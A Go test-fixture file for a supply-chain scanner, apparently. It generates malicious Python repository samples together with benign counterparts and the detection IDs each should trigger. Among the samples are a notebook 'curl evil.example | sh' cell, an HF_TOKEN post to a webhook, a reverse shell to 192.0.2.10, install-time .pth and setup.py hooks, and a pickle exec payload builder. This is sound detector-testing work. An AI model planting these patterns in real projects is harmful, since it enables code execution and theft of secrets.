package main

import (
	"archive/zip"
	"bytes"
	"time"
)

// pysrc_fixtures covers plan step 9's Python/repository half: the repository files
// that execute at install or interpreter start, the loader-safety lint, the
// taint-ish Python rules, and a notebook. Every fixture is generated in Go (the
// reference host has no Python and no network).
//
// The whl_in_repo/evil.whl fixture is a real ZIP built with archive/zip, with a
// .pth member inside: that is the install-time supply-chain shape, and it is why
// a wheel in a model repository is reported rather than trusted.
func init() {
	register(contributor{
		name: "pysrc",
		fixtures: func(f *fixtureSet) {
			// A .pth line beginning with `import` is executed by site.py at the
			// start of every interpreter run.
			f.addText("pth_executable.pth", "import os\nos.system(\"id\")\n")

			// Python 3.15+ *.start startup entry point.
			f.addText("startup_entry.start", "evilpkg.hook:run\n")

			// setup.py with a custom install command (runs during pip install).
			f.addText("setup_install_hook/setup.py", `from setuptools import setup
from setuptools.command.install import install


class Install(install):
    def run(self):
        import os
        os.system("id")
        install.run(self)


setup(name="evil", version="1.0", cmdclass={"install": Install})
`)

			// PEP 517 backend outside the known-good set: imported and run at build.
			f.addText("pyproject_bad_backend/pyproject.toml", `[build-system]
requires = ["evilbackend>=0.1"]
build-backend = "evilbackend.build"
`)

			// sitecustomize.py is imported automatically at interpreter startup.
			f.addText("sitecustomize_bad/sitecustomize.py", `import os
os.environ["PYTHONSTARTUP"] = "/tmp/evil"
`)

			// pull_request_target runs with the base repo's secrets; interpolating
			// github.event.* into a run: step is command injection there.
			f.addText("workflow_prt/.github/workflows/x.yml", `name: x
on:
  pull_request_target:
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: echo
        run: echo "${{ github.event.pull_request.title }}"
`)

			// A wheel is a ZIP; its .pth member executes on install.
			f.add("whl_in_repo/evil.whl", buildWheel())

			// Notebook: a shell escape in one cell and a base64-decoded exec in
			// another.
			f.addText("notebook_b64.ipynb", `{
 "cells": [
  {"cell_type": "markdown", "metadata": {}, "source": ["# demo\n"]},
  {"cell_type": "code", "execution_count": null, "metadata": {}, "outputs": [],
   "source": ["!curl -s http://evil.example/p.sh | sh\n"]},
  {"cell_type": "code", "execution_count": null, "metadata": {}, "outputs": [],
   "source": ["import base64\n", "exec(base64.b64decode('cHJpbnQoMSk=cHJpbnQoMSk=cHJpbnQoMSk=cHJpbnQoMSk='))\n"]}
 ],
 "metadata": {},
 "nbformat": 4,
 "nbformat_minor": 5
}
`)

			// Env token posted to a webhook: source (os.getenv) -> network sink.
			f.addText("python_exfil/model.py", `import os
import requests

TOKEN = os.getenv("HF_TOKEN")
requests.post("https://webhook.example/collect", data=TOKEN)
`)

			// base64 blob decoded and exec'd: source -> exec sink, encoder+decoder.
			f.addText("python_taint/modeling_x.py", `import base64

payload = base64.b64decode('ZXhlYygncHJpbnQoMSknKQ==ZXhlYygncHJpbnQoMSknKQ==')
exec(payload)
`)

			// A pickle payload generator: a class whose __reduce__ returns exec, and a
			// dump of it. This is the published build_pickles.py shape (abrar0503,
			// mcpotato, kemalik, mss-jpmc in the unsafe corpus).
			f.addText("python_reduce_builder/build_pickles.py", `import pickle


class Evil:
    def __init__(self, cmd):
        self._cmd = cmd

    def __reduce__(self):
        return exec, (self._cmd,)


pickle.dump(Evil("print(1)"), open("payload.pkl", "wb"))
`)

			// A reverse shell embedded in a string literal, the shape all five
			// Iredteam payload generators in the unsafe corpus use.
			f.addText("python_reverse_shell/generator.py", `import textwrap

payload = textwrap.dedent("""
def rev_shell():
    import socket, subprocess
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("192.0.2.10", 8080))
    while True:
        cmd = s.recv(1024).decode()
        out = subprocess.getoutput(cmd)
        s.sendall(out.encode())
""").strip()
`)

			// A call that imports and runs a Hub repository's code in this process.
			f.addText("python_remote_tool/exploit.py", `import transformers

transformers.load_tool('Retr0REG/huggingface-hub-tools-deserialization')
`)

			// Benign: a socket server that echoes what it receives and runs nothing.
			f.addText("benign/echo_server.py", `import socket

server = socket.socket()
server.bind(("127.0.0.1", 9000))
server.listen(1)
conn, addr = server.accept()
data = conn.recv(1024)
conn.sendall(data)
`)

			// Benign: a reducing class that returns a plain callable, and one whose
			// exec return is never dumped. Neither is a payload generator.
			f.addText("benign/reduce_plain.py", `import pickle


class Plain:
    def __init__(self):
        self.x = 1

    def __reduce__(self):
        return (self.x, ())


pickle.dump(Plain(), open("plain.pkl", "wb"))
`)
			f.addText("benign/reduce_no_dump.py", `class Inert:
    def __reduce__(self):
        return exec, ("print(1)",)


value = Inert()
`)

			// Benign: guarded loader with a pinned revision, no taint.
			f.addText("benign/model.py", `import torch
from transformers import AutoModel

REVISION = "0123456789abcdef0123456789abcdef01234567"


def load(path):
    state = torch.load(path, weights_only=True)
    model = AutoModel.from_pretrained("org/model", revision=REVISION)
    return model, state
`)

			// Benign notebook: one markdown cell and one plain print.
			f.addText("benign/clean.ipynb", `{
 "cells": [
  {"cell_type": "markdown", "metadata": {}, "source": ["# clean\n"]},
  {"cell_type": "code", "execution_count": 1, "metadata": {}, "outputs": [],
   "source": ["print(\"hello\")\n"]}
 ],
 "metadata": {},
 "nbformat": 4,
 "nbformat_minor": 5
}
`)
		},
		expectations: func() (malicious, benign map[string]expectation) {
			return map[string]expectation{
				"pth_executable.pth": {Expect: []string{"SC4N-REPO-PTH"},
					Notes: "a .pth line starting with `import` runs at every interpreter start (Python site.py)"},
				"startup_entry.start": {Expect: []string{"SC4N-REPO-START"},
					Notes: "pkg.mod:callable is a Python 3.15 interpreter-startup entry point"},
				"setup_install_hook/setup.py": {Expect: []string{"SC4N-REPO-SETUP-HOOK"},
					Notes: "cmdclass install hook runs during pip install"},
				"pyproject_bad_backend/pyproject.toml": {Expect: []string{"SC4N-REPO-BUILD-BACKEND"},
					Notes: "PEP 517 build-backend outside the known-good set is imported and run at build time"},
				"sitecustomize_bad/sitecustomize.py": {Expect: []string{"SC4N-REPO-SITE-CUSTOMIZE"},
					Notes: "sitecustomize is imported automatically at interpreter startup"},
				"workflow_prt/.github/workflows/x.yml": {Expect: []string{"SC4N-REPO-WORKFLOW-PRT"},
					Notes: "pull_request_target plus ${{ github.event.* }} in a run: step"},
				"whl_in_repo/evil.whl": {Expect: []string{"SC4N-REPO-WHEEL-IN-MODEL"},
					Notes: "a real ZIP wheel in the scanned tree; its .pth member is scanned separately"},
				"notebook_b64.ipynb": {Expect: []string{"SC4N-CODE-NOTEBOOK-MAGIC", "SC4N-CODE-TAINT-EXEC", "SC4N-CODE-ENCODED-PAYLOAD"},
					Notes: "!curl|sh shell escape plus exec(base64.b64decode(long literal)) across two cells"},
				"python_exfil/model.py": {Expect: []string{"SC4N-CODE-TAINT-NETWORK"},
					Notes: "os.getenv token sent with requests.post to a webhook"},
				"python_taint/modeling_x.py": {Expect: []string{"SC4N-CODE-TAINT-EXEC", "SC4N-CODE-ENCODED-PAYLOAD"},
					Notes: "base64.b64decode source flows into exec"},
				"python_remote_tool/exploit.py": {Expect: []string{"SC4N-CODE-REMOTE-TOOL-LOADER"},
					Notes: "load_tool('org/repo') imports a Hub repository's Python module into this " +
						"process: the repository's code runs with the caller's privileges"},
				"python_reverse_shell/generator.py": {Expect: []string{"SC4N-CODE-REVERSE-SHELL"},
					Notes: "socket + connect + recv + subprocess in one artifact, here inside a " +
						"textwrap.dedent literal: the payload text is the signal"},
				"python_reduce_builder/build_pickles.py": {Expect: []string{"SC4N-CODE-REDUCE-BUILDER"},
					Notes: "a class whose __reduce__ returns exec plus a pickle.dump of it: the " +
						"published payload-generator shape, and the human-readable half of the pickle " +
						"the engine reports when the dumped file is scanned"},
			}, map[string]expectation{
				"benign/model.py": {Forbid: []string{"SC4N-LOADER-TORCH-UNSAFE", "SC4N-LOADER-NO-REVISION", "SC4N-LOADER-NO-LOCAL-ONLY", "SC4N-CODE-TAINT-EXEC", "SC4N-CODE-TAINT-SHELL", "SC4N-CODE-OBFUSCATION"},
					Notes: "torch.load(weights_only=True) and a 40-hex revision pin must not be reported"},
				"benign/clean.ipynb": {Forbid: []string{"SC4N-CODE-NOTEBOOK-MAGIC", "SC4N-CODE-TAINT-EXEC"},
					Notes: "a plain print cell must produce no findings"},
				"benign/echo_server.py": {Forbid: []string{"SC4N-CODE-REVERSE-SHELL"},
					Notes: "a server that echoes a received line and runs no command must not be " +
						"reported as a reverse shell"},
				"benign/reduce_plain.py": {Forbid: []string{"SC4N-CODE-REDUCE-BUILDER"},
					Notes: "a reducing class returning a plain callable is not a payload builder"},
				"benign/reduce_no_dump.py": {Forbid: []string{"SC4N-CODE-REDUCE-BUILDER"},
					Notes: "an exec-returning __reduce__ with no serialiser dump never reaches disk"},
			}
		},
	})
}

// buildWheel constructs a deterministic, well-formed wheel ZIP with a .pth member.
func buildWheel() []byte {
	var buf bytes.Buffer
	zw := zip.NewWriter(&buf)
	mod := time.Date(2026, 1, 1, 0, 0, 0, 0, time.UTC)
	add := func(name, body string) {
		h := &zip.FileHeader{Name: name, Method: zip.Deflate, Modified: mod}
		w, err := zw.CreateHeader(h)
		if err != nil {
			panic("pysrc fixtures: zip member " + name + ": " + err.Error())
		}
		if _, err := w.Write([]byte(body)); err != nil {
			panic("pysrc fixtures: write " + name + ": " + err.Error())
		}
	}
	add("evil.pth", "import os\nos.system(\"id\")\n")
	add("evil/__init__.py", "__version__ = \"1.0\"\n")
	add("evil-1.0.dist-info/METADATA", "Metadata-Version: 2.1\nName: evil\nVersion: 1.0\n")
	add("evil-1.0.dist-info/WHEEL", "Wheel-Version: 1.0\nGenerator: sc4nfixtures\nRoot-Is-Purelib: true\nTag: py3-none-any\n")
	add("evil-1.0.dist-info/RECORD", "evil.pth,,\nevil/__init__.py,,\n")
	if err := zw.Close(); err != nil {
		panic("pysrc fixtures: close zip: " + err.Error())
	}
	return buf.Bytes()
}
